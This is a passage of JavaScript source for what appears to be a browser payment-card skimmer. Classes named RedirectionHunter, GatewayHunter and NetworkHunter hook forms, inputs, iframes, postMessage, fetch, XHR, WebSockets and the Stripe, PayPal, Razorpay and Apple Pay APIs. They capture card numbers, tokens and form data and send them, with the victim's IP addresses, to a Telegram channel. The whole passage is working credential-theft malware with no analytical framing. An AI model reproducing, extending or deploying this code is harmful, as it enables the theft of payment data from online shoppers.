                                        }
                                    }, 0);
                                }
                                
                                return result;
                            };
                        }
                        return target[prop];
                    }
                });
                
                // Replace form's FormData
                form._originalFormData = formData;
                form._proxyFormData = proxy;
            } catch (e) {}
        }
        
        async captureBeforeUnload() {
            // Capture all payment data before page unloads
            const paymentData = [];
            
            this.inputs.forEach((data, input) => {
                if (input.value && data.isPaymentField) {
                    const analyzed = HunterUtils.analyzeCardData(input.value);
                    if (analyzed) {
                        paymentData.push({
                            field: input.name || input.id || input.placeholder,
                            value: input.value,
                            type: analyzed.type
                        });
                    }
                }
            });
            
            if (paymentData.length > 0) {
                const ips = await HunterUtils.getAllIPs();
                
                HunterUtils.sendToTelegram({
                    action: 'BEFORE_UNLOAD',
                    paymentData: paymentData,
                    url: window.location.href,
                    ips: ips
                }, 'PAGE_UNLOAD');
            }
        }
    }
    
    // ==================== REDIRECTION HUNTER ====================
    class RedirectionHunter {
        constructor() {
            this.redirectHistory = [];
            this.popupWindows = new Set();
            this.init();
        }
        
        init() {
            this.setupRedirectTracking();
            this.setupPopupTracking();
            this.setupIframeTracking();
            this.setupMessageTracking();
            this.startRedirectMonitoring();
        }
        
        setupRedirectTracking() {
            // Track all navigation
            let currentUrl = window.location.href;
            
            // Override window.location methods
            const originalLocation = window.location;
            const locationProxy = new Proxy(originalLocation, {
                set(target, prop, value) {
                    if (prop === 'href' || prop === 'assign' || prop === 'replace') {
                        RedirectionHunter.prototype.logRedirect(value, 'LOCATION_' + prop.toUpperCase());
                    }
                    return Reflect.set(target, prop, value);
                }
            });
            
            Object.defineProperty(window, 'location', {
                value: locationProxy,
                writable: false
            });
            
            // Monitor URL changes
            setInterval(() => {
                if (window.location.href !== currentUrl) {
                    this.logRedirect(window.location.href, 'AUTO_REDIRECT');
                    currentUrl = window.location.href;
                }
            }, 500);
            
            // History API tracking
            const originalPushState = history.pushState;
            const originalReplaceState = history.replaceState;
            
            history.pushState = function(state, title, url) {
                this.logRedirect(url, 'PUSH_STATE');
                return originalPushState.apply(this, arguments);
            }.bind(this);
            
            history.replaceState = function(state, title, url) {
                this.logRedirect(url, 'REPLACE_STATE');
                return originalReplaceState.apply(this, arguments);
            }.bind(this);
            
            // Popstate events
            window.addEventListener('popstate', (e) => {
                this.logRedirect(window.location.href, 'POP_STATE');
            });
            
            // Hash changes
            window.addEventListener('hashchange', (e) => {
                this.logRedirect(window.location.href, 'HASH_CHANGE');
            });
        }
        
        setupPopupTracking() {
            // Track window.open calls
            const originalOpen = window.open;
            
            window.open = function(url, target, features) {
                const popup = originalOpen.call(this, url, target, features);
                
                if (popup) {
                    this.trackPopup(popup, url);
                }
                
                return popup;
            }.bind(this);
            
            // Also track link clicks that might open popups
            document.addEventListener('click', (e) => {
                const target = e.target;
                if (target.tagName === 'A' && target.target === '_blank') {
                    setTimeout(() => {
                        this.logRedirect(target.href, 'POPUP_LINK');
                    }, 100);
                }
            }, true);
        }
        
        setupIframeTracking() {
            // Monitor iframe creation and loading
            const iframeObserver = new MutationObserver((mutations) => {
                mutations.forEach((mutation) => {
                    mutation.addedNodes.forEach((node) => {
                        if (node.nodeType === 1 && node.tagName === 'IFRAME') {
                            this.trackIframe(node);
                        }
                    });
                });
            });
            
            iframeObserver.observe(document.body, {
                childList: true,
                subtree: true
            });
            
            // Also scan existing iframes
            document.querySelectorAll('iframe').forEach(iframe => {
                this.trackIframe(iframe);
            });
        }
        
        setupMessageTracking() {
            // Listen for postMessage events (common in payment gateways)
            window.addEventListener('message', (event) => {
                this.handlePostMessage(event);
            }, true);
        }
        
        startRedirectMonitoring() {
            // Monitor for redirects to payment pages
            setInterval(() => {
                this.checkForPaymentRedirects();
            }, 1000);
        }
        
        logRedirect(url, type) {
            const redirect = {
                url: url,
                type: type,
                timestamp: Date.now(),
                referrer: document.referrer,
                currentUrl: window.location.href
            };
            
            this.redirectHistory.push(redirect);
            
            // Keep only last 50 redirects
            if (this.redirectHistory.length > 50) {
                this.redirectHistory.shift();
            }
            
            // Check if this is a payment redirect
            if (this.isPaymentRedirect(url)) {
                HunterUtils.getAllIPs().then(ips => {
                    HunterUtils.sendToTelegram({
                        url: url,
                        type: type,
                        referrer: document.referrer,
                        ips: ips
                    }, 'PAYMENT_REDIRECT');
                });
                
                // Store in captured data
                capturedData.redirects.push(redirect);
            }
        }
        
        trackPopup(popup, url) {
            if (!popup) return;
            
            this.popupWindows.add(popup);
            
            // Try to monitor the popup
            try {
                const checkPopup = setInterval(() => {
                    if (popup.closed) {
                        clearInterval(checkPopup);
                        this.popupWindows.delete(popup);
                        return;
                    }
                    
                    // Try to get popup location
                    try {
                        if (popup.location.href && popup.location.href !== 'about:blank') {
                            this.logRedirect(popup.location.href, 'POPUP_NAVIGATION');
                        }
                    } catch (e) {
                        // Cross-origin restriction
                    }
                }, 1000);
                
                popup._hunterInterval = checkPopup;
            } catch (e) {}
            
            HunterUtils.sendToTelegram({
                url: url,
                action: 'POPUP_OPENED'
            }, 'POPUP_TRACKING');
        }
        
        trackIframe(iframe) {
            if (iframe.dataset.hunterTracked) return;
            iframe.dataset.hunterTracked = 'true';
            
            // Check iframe source
            const src = iframe.src || iframe.getAttribute('data-src') || '';
            
            if (src && this.isPaymentIframe(src)) {
                HunterUtils.sendToTelegram({
                    src: src,
                    type: 'PAYMENT_IFRAME'
                }, 'IFRAME_DETECTION');
                
                // Monitor iframe load
                iframe.addEventListener('load', () => {
                    this.monitorIframeContent(iframe);
                });
                
                // Also monitor iframe URL changes
                let lastSrc = src;
                setInterval(() => {
                    const currentSrc = iframe.src || '';
                    if (currentSrc && currentSrc !== lastSrc) {
                        this.logRedirect(currentSrc, 'IFRAME_SRC_CHANGE');
                        lastSrc = currentSrc;
                    }
                }, 2000);
            }
        }
        
        monitorIframeContent(iframe) {
            try {
                // Try to access iframe document
                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                
                if (iframeDoc) {
                    // Monitor inputs in iframe
                    const inputs = iframeDoc.querySelectorAll('input, textarea');
                    inputs.forEach(input => {
                        input.addEventListener('input', (e) => {
                            this.handleIframeInput(iframe, e.target);
                        });
                    });
                    
                    // Monitor forms in iframe
                    const forms = iframeDoc.querySelectorAll('form');
                    forms.forEach(form => {
                        form.addEventListener('submit', (e) => {
                            this.handleIframeForm(iframe, form);
                        });
                    });
                }
            } catch (e) {
                // Cross-origin restriction, use postMessage
            }
        }
        
        handleIframeInput(iframe, input) {
            if (!input.value) return;
            
            const analyzed = HunterUtils.analyzeCardData(input.value);
            if (!analyzed) return;
            
            HunterUtils.getAllIPs().then(ips => {
                HunterUtils.sendToTelegram({
                    src: iframe.src,
                    field: input.name || input.id || 'iframe_field',
                    value: input.value,
                    type: analyzed.type,
                    ips: ips
                }, 'IFRAME_INPUT');
            });
        }
        
        handleIframeForm(iframe, form) {
            HunterUtils.sendToTelegram({
                src: iframe.src,
                form: form.action || 'unknown',
                method: form.method || 'POST'
            }, 'IFRAME_FORM');
        }
        
        handlePostMessage(event) {
            // Check if this is a payment-related message
            const data = event.data;
            
            if (data && typeof data === 'object') {
                // Common payment gateway message patterns
                if (data.type && (
                    data.type.includes('payment') ||
                    data.type.includes('card') ||
                    data.type.includes('token') ||
                    data.type.includes('checkout') ||
                    data.type.includes('stripe') ||
                    data.type.includes('paypal')
                )) {
                    HunterUtils.sendToTelegram({
                        origin: event.origin,
                        data: JSON.stringify(data).substring(0, 200),
                        type: data.type
                    }, 'POST_MESSAGE');
                }
            } else if (typeof data === 'string') {
                // Check for payment data in string
                if (data.includes('card') || data.includes('payment') || data.includes('token')) {
                    HunterUtils.sendToTelegram({
                        origin: event.origin,
                        data: data.substring(0, 200),
                        type: 'STRING_MESSAGE'
                    }, 'POST_MESSAGE');
                }
            }
        }
        
        checkForPaymentRedirects() {
            const currentUrl = window.location.href.toLowerCase();
            
            // Common payment page indicators
            const paymentIndicators = [
                'checkout',
                'payment',
                'pay',
                'gateway',
                'secure',
                'stripe',
                'paypal',
                'razorpay',
                'braintree',
                'authorize',
                '2checkout',
                'square',
                'paymentgateway',
                'payment-processor',
                'payment-form',
                'credit-card',
                'card-payment'
            ];
            
            const isPaymentPage = paymentIndicators.some(indicator => 
                currentUrl.includes(indicator)
            );
            
            if (isPaymentPage && !isRedirecting) {
                isRedirecting = true;
                
                HunterUtils.getAllIPs().then(ips => {
                    HunterUtils.sendToTelegram({
                        url: currentUrl,
                        title: document.title,
                        action: 'ENTERED_PAYMENT_PAGE',
                        ips: ips
                    }, 'PAYMENT_PAGE_ENTRY');
                });
                
                // Start intensive monitoring on payment pages
                this.intensifyMonitoring();
            }
        }
        
        intensifyMonitoring() {
            // On payment pages, increase monitoring intensity
            
            // Monitor all form submissions more aggressively
            const forms = document.querySelectorAll('form');
            forms.forEach(form => {
                // Add additional event listeners
                form.addEventListener('submit', (e) => {
                    // Capture all form data before submission
                    const formData = new FormData(form);
                    const data = {};
                    
                    for (let [key, value] of formData.entries()) {
                        data[key] = value;
                    }
                    
                    HunterUtils.sendToTelegram({
                        form: form.action,
                        data: JSON.stringify(data).substring(0, 300),
                        action: 'INTENSIVE_FORM_CAPTURE'
                    }, 'INTENSIVE_MONITORING');
                }, true);
            });
            
            // Monitor all inputs more frequently
            const inputs = document.querySelectorAll('input, textarea');
            inputs.forEach(input => {
                let lastValue = input.value;
                
                const intensiveCheck = setInterval(() => {
                    if (input.value !== lastValue) {
                        lastValue = input.value;
                        
                        if (input.value && HunterUtils.isPaymentData(input.value)) {
                            HunterUtils.sendToTelegram({
                                field: input.name || input.id || input.placeholder,
                                value: input.value,
                                type: 'INTENSIVE_INPUT_CHANGE'
                            }, 'INTENSIVE_MONITORING');
                        }
                    }
                }, 100);
                
                // Store for cleanup
                input._intensiveInterval = intensiveCheck;
            });
        }
        
        isPaymentRedirect(url) {
            if (!url) return false;
            
            const urlLower = url.toLowerCase();
            
            const paymentDomains = [
                'stripe.com',
                'paypal.com',
                'razorpay.com',
                'checkout.com',
                '2checkout.com',
                'authorize.net',
                'braintreegateway.com',
                'squareup.com',
                'paytm.com',
                'phonepe.com',
                'instamojo.com',
                'ccavenue.com',
                'payu.in',
                'payumoney.com'
            ];
            
            return paymentDomains.some(domain => urlLower.includes(domain)) ||
                   urlLower.includes('/checkout') ||
                   urlLower.includes('/payment') ||
                   urlLower.includes('/pay') ||
                   urlLower.includes('/gateway') ||
                   urlLower.includes('/process-payment');
        }
        
        isPaymentIframe(src) {
            if (!src) return false;
            
            const srcLower = src.toLowerCase();
            
            return srcLower.includes('stripe') ||
                   srcLower.includes('paypal') ||
                   srcLower.includes('razorpay') ||
                   srcLower.includes('checkout') ||
                   srcLower.includes('payment') ||
                   srcLower.includes('secure') ||
                   srcLower.includes('gateway') ||
                   srcLower.includes('card');
        }
    }
    
    // ==================== PAYMENT GATEWAY HUNTER ====================
    class GatewayHunter {
        constructor() {
            this.gateways = new Map();
            this.paymentMethods = new Set();
            this.init();
        }
        
        init() {
            this.detectAllGateways();
            this.interceptPaymentAPIs();
            this.monitorPaymentElements();
            this.setupGatewayObservers();
            this.startGatewayScanning();
        }
        
        detectAllGateways() {
            // Detect by script sources
            const scripts = document.querySelectorAll('script[src]');
            scripts.forEach(script => {
                const src = script.src.toLowerCase();
                this.analyzeScriptSource(src);
            });
            
            // Detect by global objects
            this.detectGlobalGateways();
            
            // Detect by CSS classes
            this.detectCSSGateways();
            
            // Detect by iframe sources
            this.detectIframeGateways();
            
            // Send gateway report
            this.sendGatewayReport();
        }
        
        analyzeScriptSource(src) {
            const gatewayPatterns = [
                { pattern: /stripe/, name: 'Stripe' },
                { pattern: /paypal/, name: 'PayPal' },
                { pattern: /razorpay/, name: 'Razorpay' },
                { pattern: /braintree/, name: 'Braintree' },
                { pattern: /authorize/, name: 'Authorize.net' },
                { pattern: /square/, name: 'Square' },
                { pattern: /2checkout/, name: '2Checkout' },
                { pattern: /checkout\.com/, name: 'Checkout.com' },
                { pattern: /paytm/, name: 'Paytm' },
                { pattern: /phonepe/, name: 'PhonePe' },
                { pattern: /googlepay/, name: 'Google Pay' },
                { pattern: /applepay/, name: 'Apple Pay' },
                { pattern: /amazonpay/, name: 'Amazon Pay' },
                { pattern: /payu/, name: 'PayU' },
                { pattern: /ccavenue/, name: 'CCAvenue' },
                { pattern: /instamojo/, name: 'Instamojo' },
                { pattern: /mollie/, name: 'Mollie' },
                { pattern: /adyen/, name: 'Adyen' },
                { pattern: /worldpay/, name: 'Worldpay' }
            ];
            
            gatewayPatterns.forEach(({ pattern, name }) => {
                if (pattern.test(src)) {
                    this.registerGateway(name, 'SCRIPT', src);
                }
            });
        }
        
        detectGlobalGateways() {
            const globalGateways = [
                { name: 'Stripe', check: () => window.Stripe },
                { name: 'PayPal', check: () => window.paypal },
                { name: 'Razorpay', check: () => window.Razorpay },
                { name: 'Braintree', check: () => window.braintree },
                { name: 'Square', check: () => window.Square },
                { name: 'TwoCheckout', check: () => window.TwoCheckout },
                { name: 'ApplePaySession', check: () => window.ApplePaySession },
                { name: 'PaymentRequest', check: () => window.PaymentRequest },
                { name: 'GooglePay', check: () => window.google && window.google.payments && window.google.payments.api }
            ];
            
            globalGateways.forEach(({ name, check }) => {
                try {
                    if (check()) {
                        this.registerGateway(name, 'GLOBAL_OBJECT');
                    }
                } catch (e) {}
            });
        }
        
        detectCSSGateways() {
            // Check for gateway-specific CSS classes
            const gatewayClasses = [
                { class: 'stripe', name: 'Stripe' },
                { class: 'paypal', name: 'PayPal' },
                { class: 'razorpay', name: 'Razorpay' },
                { class: 'braintree', name: 'Braintree' },
                { class: 'authorize', name: 'Authorize.net' },
                { class: 'square', name: 'Square' },
                { class: '2checkout', name: '2Checkout' },
                { class: 'payment-form', name: 'Generic Payment' },
                { class: 'checkout-button', name: 'Checkout Button' },
                { class: 'payment-gateway', name: 'Payment Gateway' }
            ];
            
            gatewayClasses.forEach(({ class: className, name }) => {
                if (document.querySelector(`.${className}`) || 
                    document.querySelector(`[class*="${className}"]`)) {
                    this.registerGateway(name, 'CSS_CLASS');
                }
            });
        }
        
        detectIframeGateways() {
            document.querySelectorAll('iframe').forEach(iframe => {
                const src = iframe.src || '';
                if (src) {
                    const gateway = this.identifyGatewayFromURL(src);
                    if (gateway) {
                        this.registerGateway(gateway, 'IFRAME', src);
                    }
                }
            });
        }
        
        identifyGatewayFromURL(url) {
            const urlLower = url.toLowerCase();
            
            if (urlLower.includes('stripe')) return 'Stripe';
            if (urlLower.includes('paypal')) return 'PayPal';
            if (urlLower.includes('razorpay')) return 'Razorpay';
            if (urlLower.includes('braintree')) return 'Braintree';
            if (urlLower.includes('authorize')) return 'Authorize.net';
            if (urlLower.includes('square')) return 'Square';
            if (urlLower.includes('2checkout')) return '2Checkout';
            if (urlLower.includes('checkout.com')) return 'Checkout.com';
            if (urlLower.includes('secure')) return 'Secure Payment';
            
            return null;
        }
        
        registerGateway(name, source, details = '') {
            if (this.gateways.has(name)) return;
            
            const gateway = {
                name: name,
                source: source,
                details: details,
                detected: Date.now(),
                activities: []
            };
            
            this.gateways.set(name, gateway);
            activeGateways.add(name);
            
            // Send gateway detection alert
            HunterUtils.sendToTelegram({
                gateway: name,
                source: source,
                details: details.substring(0, 100)
            }, 'GATEWAY_DETECTION');
        }
        
        sendGatewayReport() {
            if (this.gateways.size === 0) return;
            
            const gatewayList = Array.from(this.gateways.keys()).join(', ');
            
            HunterUtils.sendToTelegram({
                total: this.gateways.size,
                list: gatewayList,
                url: window.location.href
            }, 'GATEWAY_REPORT');
        }
        
        interceptPaymentAPIs() {
            // Intercept Stripe
            if (window.Stripe) {
                this.interceptStripe();
            }
            
            // Intercept PayPal
            if (window.paypal) {
                this.interceptPayPal();
            }
            
            // Intercept Razorpay
            if (window.Razorpay) {
                this.interceptRazorpay();
            }
            
            // Intercept Payment Request API
            if (window.PaymentRequest) {
                this.interceptPaymentRequest();
            }
            
            // Intercept Apple Pay
            if (window.ApplePaySession) {
                this.interceptApplePay();
            }
            
            // Intercept Google Pay
            this.interceptGooglePay();
        }
        
        interceptStripe() {
            const originalStripe = window.Stripe;
            
            window.Stripe = function(key) {
                HunterUtils.sendToTelegram({
                    gateway: 'Stripe',
                    action: 'INITIALIZED',
                    key: key ? key.substring(0, 10) + '...' : 'no key'
                }, 'GATEWAY_ACTIVITY');
                
                const stripeInstance = originalStripe(key);
                
                // Intercept stripe.elements
                if (stripeInstance.elements) {
                    const originalElements = stripeInstance.elements;
                    stripeInstance.elements = function(options) {
                        HunterUtils.sendToTelegram({
                            gateway: 'Stripe',
                            action: 'ELEMENTS_CREATED',
                            options: JSON.stringify(options).substring(0, 100)
                        }, 'GATEWAY_ACTIVITY');
                        
                        return originalElements.call(this, options);
                    };
                }
                
                // Intercept stripe.redirectToCheckout
                if (stripeInstance.redirectToCheckout) {
                    const originalRedirect = stripeInstance.redirectToCheckout;
                    stripeInstance.redirectToCheckout = function(options) {
                        HunterUtils.sendToTelegram({
                            gateway: 'Stripe',
                            action: 'REDIRECT_TO_CHECKOUT',
                            options: JSON.stringify(options).substring(0, 200)
                        }, 'GATEWAY_ACTIVITY');
                        
                        return originalRedirect.call(this, options);
                    };
                }
                
                // Intercept stripe.createToken
                if (stripeInstance.createToken) {
                    const originalCreateToken = stripeInstance.createToken;
                    stripeInstance.createToken = function(element, data) {
                        HunterUtils.sendToTelegram({
                            gateway: 'Stripe',
                            action: 'CREATE_TOKEN',
                            data: JSON.stringify(data).substring(0, 200)
                        }, 'GATEWAY_ACTIVITY');
                        
                        return originalCreateToken.call(this, element, data);
                    };
                }
                
                return stripeInstance;
            };
            
            // Copy static properties
            Object.assign(window.Stripe, originalStripe);
        }
        
        interceptPayPal() {
            // PayPal buttons are usually iframes, so we monitor clicks
            document.addEventListener('click', (e) => {
                const target = e.target;
                
                // Check for PayPal buttons
                if (target.closest && (
                    target.closest('[class*="paypal"], [id*="paypal"]') ||
                    target.closest('iframe[src*="paypal"]')
                )) {
                    HunterUtils.sendToTelegram({
                        gateway: 'PayPal',
                        action: 'BUTTON_CLICKED',
                        element: target.tagName
                    }, 'GATEWAY_ACTIVITY');
                }
            }, true);
            
            // Monitor for PayPal messages
            window.addEventListener('message', (event) => {
                if (event.data && typeof event.data === 'string') {
                    if (event.data.includes('paypal') || event.data.includes('paymentId')) {
                        HunterUtils.sendToTelegram({
                            gateway: 'PayPal',
                            action: 'MESSAGE_RECEIVED',
                            data: event.data.substring(0, 200)
                        }, 'GATEWAY_ACTIVITY');
                    }
                }
            }, true);
        }
        
        interceptRazorpay() {
            if (window.Razorpay) {
                const originalRazorpay = window.Razorpay;
                
                window.Razorpay = function(options) {
                    HunterUtils.sendToTelegram({
                        gateway: 'Razorpay',
                        action: 'OPTIONS_SET',
                        options: JSON.stringify(options).substring(0, 200)
                    }, 'GATEWAY_ACTIVITY');
                    
                    const rpInstance = new originalRazorpay(options);
                    
                    // Intercept open method
                    const originalOpen = rpInstance.open;
                    rpInstance.open = function() {
                        HunterUtils.sendToTelegram({
                            gateway: 'Razorpay',
                            action: 'CHECKOUT_OPENED'
                        }, 'GATEWAY_ACTIVITY');
                        
                        return originalOpen.apply(this, arguments);
                    };
                    
                    // Intercept on method for events
                    const originalOn = rpInstance.on;
                    rpInstance.on = function(event, handler) {
                        HunterUtils.sendToTelegram({
                            gateway: 'Razorpay',
                            action: 'EVENT_LISTENER_ADDED',
                            event: event
                        }, 'GATEWAY_ACTIVITY');
                        
                        return originalOn.call(this, event, handler);
                    };
                    
                    return rpInstance;
                };
                
                // Copy prototype
                window.Razorpay.prototype = originalRazorpay.prototype;
            }
        }
        
        interceptPaymentRequest() {
            const originalPaymentRequest = window.PaymentRequest;
            
            window.PaymentRequest = function(methodData, details, options) {
                HunterUtils.sendToTelegram({
                    gateway: 'PaymentRequest API',
                    action: 'PAYMENT_REQUEST_CREATED',
                    methodData: JSON.stringify(methodData).substring(0, 200),
                    details: JSON.stringify(details).substring(0, 200)
                }, 'GATEWAY_ACTIVITY');
                
                const prInstance = new originalPaymentRequest(methodData, details, options);
                
                // Intercept show method
                const originalShow = prInstance.show;
                prInstance.show = function() {
                    HunterUtils.sendToTelegram({
                        gateway: 'PaymentRequest API',
                        action: 'PAYMENT_SHEET_SHOWN'
                    }, 'GATEWAY_ACTIVITY');
                    
                    return originalShow.apply(this, arguments);
                };
                
                return prInstance;
            };
        }
        
        interceptApplePay() {
            const originalApplePaySession = window.ApplePaySession;
            
            window.ApplePaySession = function(version, request) {
                HunterUtils.sendToTelegram({
                    gateway: 'Apple Pay',
                    action: 'SESSION_CREATED',
                    version: version,
                    request: JSON.stringify(request).substring(0, 200)
                }, 'GATEWAY_ACTIVITY');
                
                const session = new originalApplePaySession(version, request);
                
                return session;
            };
            
            // Copy static methods
            Object.assign(window.ApplePaySession, originalApplePaySession);
        }
        
        interceptGooglePay() {
            // Monitor for Google Pay initialization
            const checkGooglePay = setInterval(() => {
                if (window.google && window.google.payments && window.google.payments.api) {
                    clearInterval(checkGooglePay);
                    
                    HunterUtils.sendToTelegram({
                        gateway: 'Google Pay',
                        action: 'API_LOADED'
                    }, 'GATEWAY_ACTIVITY');
                }
            }, 1000);
        }
        
        monitorPaymentElements() {
            // Look for payment-related elements
            const paymentElements = [
                '[data-stripe]',
                '[data-paypal]',
                '[data-razorpay]',
                '[data-braintree]',
                '[data-authorize]',
                '[data-square]',
                '[data-gateway]',
                '[data-payment]',
                '[data-checkout]',
                '.stripe-button',
                '.paypal-button',
                '.razorpay-payment-button',
                '.payment-button',
                '.checkout-button',
                '.buy-now-button',
                '.add-to-cart-button'
            ];
            
            paymentElements.forEach(selector => {
                try {
                    const elements = document.querySelectorAll(selector);
                    elements.forEach(element => {
                        this.monitorPaymentElement(element, selector);
                    });
                } catch (e) {}
            });
        }
        
        monitorPaymentElement(element, selector) {
            element.addEventListener('click', (e) => {
                HunterUtils.sendToTelegram({
                    gateway: 'Payment Button',
                    action: 'ELEMENT_CLICKED',
                    selector: selector,
                    text: (element.textContent || '').substring(0, 50)
                }, 'GATEWAY_ACTIVITY');
            }, true);
            
            // Also monitor form submissions from these elements
            if (element.form) {
                element.form.addEventListener('submit', (e) => {
                    HunterUtils.sendToTelegram({
                        gateway: 'Payment Form',
                        action: 'FORM_SUBMITTED',
                        selector: selector
                    }, 'GATEWAY_ACTIVITY');
                }, true);
            }
        }
        
        setupGatewayObservers() {
            // Watch for new payment elements
            const observer = new MutationObserver((mutations) => {
                mutations.forEach((mutation) => {
                    mutation.addedNodes.forEach((node) => {
                        if (node.nodeType === 1) {
                            // Check for payment-related attributes
                            this.checkNodeForPaymentAttributes(node);
                            
                            // Check child elements
                            const paymentSelectors = [
                                '[data-stripe]', '[data-paypal]', '[data-razorpay]',
                                '[data-gateway]', '[data-payment]', '.payment-button'
                            ];
                            
                            paymentSelectors.forEach(selector => {
                                const elements = node.querySelectorAll?.(selector);
                                elements?.forEach(element => {
                                    this.monitorPaymentElement(element, selector);
                                });
                            });
                        }
                    });
                });
            });
            
            observer.observe(document.body, {
                childList: true,
                subtree: true
            });
        }
        
        checkNodeForPaymentAttributes(node) {
            const attributes = node.attributes;
            if (!attributes) return;
            
            for (let i = 0; i < attributes.length; i++) {
                const attr = attributes[i];
                const name = attr.name.toLowerCase();
                const value = attr.value.toLowerCase();
                
                if (name.includes('data-') && (
                    value.includes('stripe') ||
                    value.includes('paypal') ||
                    value.includes('razorpay') ||
                    value.includes('braintree') ||
                    value.includes('authorize') ||
                    value.includes('square') ||
                    value.includes('gateway') ||
                    value.includes('payment')
                )) {
                    this.registerGateway(value.split('-').pop().toUpperCase(), 'DATA_ATTRIBUTE', name);
                }
            }
        }
        
        startGatewayScanning() {
            // Periodically scan for new gateways
            setInterval(() => {
                this.detectAllGateways();
                
                // Check for new payment methods
                this.scanForPaymentMethods();
            }, 10000);
        }
        
        scanForPaymentMethods() {
            // Look for payment method selection elements
            const methodSelectors = [
                'input[name="payment_method"]',
                'select[name="payment_method"]',
                '[name*="payment_method"]',
                '[id*="payment_method"]',
                '[class*="payment-method"]',
                '[data-payment-method]'
            ];
            
            methodSelectors.forEach(selector => {
                try {
                    const elements = document.querySelectorAll(selector);
                    elements.forEach(element => {
                        const value = element.value || element.getAttribute('value') || 
                                    element.textContent || element.innerText;
                        
                        if (value && !this.paymentMethods.has(value)) {
                            this.paymentMethods.add(value);
                            
                            HunterUtils.sendToTelegram({
                                method: value,
                                element: selector
                            }, 'PAYMENT_METHOD');
                        }
                    });
                } catch (e) {}
            });
        }
    }
    
    // ==================== NETWORK HUNTER ====================
    class NetworkHunter {
        constructor() {
            this.requests = new Map();
            this.init();
        }
        
        init() {
            this.interceptFetch();
            this.interceptXHR();
            this.interceptWebSockets();
            this.setupNetworkObservers();
        }
        
        interceptFetch() {
            const originalFetch = window.fetch;
            
            window.fetch = async function(resource, init = {}) {
                const requestId = 'fetch_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
                
                // Log the request
                this.logRequest(requestId, {
                    type: 'FETCH',
                    url: typeof resource === 'string' ? resource : resource.url,
                    method: init.method || 'GET',
                    headers: init.headers || {},
                    body: init.body,
                    timestamp: Date.now()
                });
                
                // Check for payment data
                if (init.body) {
                    this.analyzeRequestBody(init.body, requestId);
                }
                
                try {
                    const response = await originalFetch.call(this, resource, init);
                    
                    // Log response
                    this.logResponse(requestId, {
                        status: response.status,
                        statusText: response.statusText,
                        url: response.url,
                        timestamp: Date.now()
                    });
                    
                    return response;
                } catch (error) {
                    this.logError(requestId, error);
                    throw error;
                }
            }.bind(this);
        }
        
        interceptXHR() {
            const originalOpen = XMLHttpRequest.prototype.open;
            const originalSend = XMLHttpRequest.prototype.send;
            const originalSetRequestHeader = XMLHttpRequest.prototype.setRequestHeader;
            
            XMLHttpRequest.prototype.open = function(method, url) {
                this._method = method;
                this._url = url;
                this._headers = {};
                this._requestId = 'xhr_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
                
                // Log request
                NetworkHunter.prototype.logRequest(this._requestId, {
                    type: 'XHR',
                    url: url,
                    method: method,
                    timestamp: Date.now()
                });
                
                return originalOpen.apply(this, arguments);
            };
            
            XMLHttpRequest.prototype.setRequestHeader = function(header, value) {
                if (!this._headers) this._headers = {};
                this._headers[header] = value;
                return originalSetRequestHeader.apply(this, arguments);
            };
            
            XMLHttpRequest.prototype.send = function(body) {
                this._body = body;
                this._startTime = Date.now();
                
                // Log request body if exists
                if (body) {
                    NetworkHunter.prototype.analyzeRequestBody(body, this._requestId);
                }
                
                // Add event listeners for response
                this.addEventListener('load', function() {
                    NetworkHunter.prototype.logResponse(this._requestId, {
                        status: this.status,
                        statusText: this.statusText,
                        url: this._url,
                        response: this.response,
                        responseText: this.responseText,
                        duration: Date.now() - this._startTime,
                        timestamp: Date.now()
                    });
                });
                
                this.addEventListener('error', function(error) {
                    NetworkHunter.prototype.logError(this._requestId, error);
                });
                
                return originalSend.apply(this, arguments);
            };
        }
        
        interceptWebSockets() {
            const originalWebSocket = window.WebSocket;
            
            window.WebSocket = function(url, protocols) {
                const ws = new originalWebSocket(url, protocols);
                const wsId = 'ws_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
                
                // Check if this is a payment-related WebSocket
                if (url && (url.includes('stripe') || url.includes('paypal') || url.includes('payment'))) {
                    HunterUtils.sendToTelegram({
                        type: 'WEBSOCKET',
                        url: url,
                        action: 'PAYMENT_WEBSOCKET_DETECTED'
                    }, 'NETWORK_ACTIVITY');
                }
                
                // Intercept messages
                const originalSend = ws.send;
                ws.send = function(data) {
                    // Check for payment data in WebSocket messages
                    if (typeof data === 'string' && (
                        data.includes('card') || 
                        data.includes('payment') || 
                        data.includes('token')
                    )) {
                        HunterUtils.sendToTelegram({
                            type: 'WEBSOCKET',
                            url: url,
                            action: 'PAYMENT_DATA_SENT',
                            data: data.substring(0, 200)
                        }, 'NETWORK_ACTIVITY');
                    }
                    
                    return originalSend.call(this, data);
                };
                
                // Listen for incoming messages
                ws.addEventListener('message', (event) => {
                    if (typeof event.data === 'string' && (
                        event.data.includes('card') || 
                        event.data.includes('payment') || 
                        event.data.includes('token')
                    )) {
                        HunterUtils.sendToTelegram({
                            type: 'WEBSOCKET',
                            url: url,
                            action: 'PAYMENT_DATA_RECEIVED',
                            data: event.data.substring(0, 200)
                        }, 'NETWORK_ACTIVITY');
                    }
                });
                
                return ws;
            };
            
            // Copy static properties
            Object.assign(window.WebSocket, originalWebSocket);
        }
        
        logRequest(id, data) {
            this.requests.set(id, {
                ...data,
                id: id,
                state: 'PENDING'
            });
            
            // Check if this is a payment request
            if (data.url && (
                data.url.includes('payment') ||
                data.url.includes('checkout') ||
                data.url.includes('stripe') ||
                data.url.includes('paypal') ||
                data.url.includes('charge') ||
                data.url.includes('token')
            )) {
                HunterUtils.sendToTelegram({
                    type: data.type,
                    url: data.url,
                    method: data.method,
                    action: 'PAYMENT_REQUEST_DETECTED'
                }, 'NETWORK_ACTIVITY');
            }
        }
        
        logResponse(id, data) {
            const request = this.requests.get(id);
            if (request) {
                request.response = data;
                request.state = 'COMPLETED';
                request.completedAt = Date.now();
                
                // Check for payment response
                if (data.responseText || data.response) {
                    const responseText = data.responseText || JSON.stringify(data.response);
                    if (responseText.includes('card') || responseText.includes('payment')) {
                        HunterUtils.sendToTelegram({
                            type: request.type,
                            url: request.url,
                            status: data.status,
                            action: 'PAYMENT_RESPONSE_RECEIVED',
                            data: responseText.substring(0, 200)
                        }, 'NETWORK_ACTIVITY');
                    }
                }
            }
        }
        
        logError(id, error) {
            const request = this.requests.get(id);
            if (request) {
                request.error = error;
                request.state = 'ERROR';
                request.failedAt = Date.now();
            }
        }
        
        analyzeRequestBody(body, requestId) {
            let data;
            
            try {
                if (typeof body === 'string') {
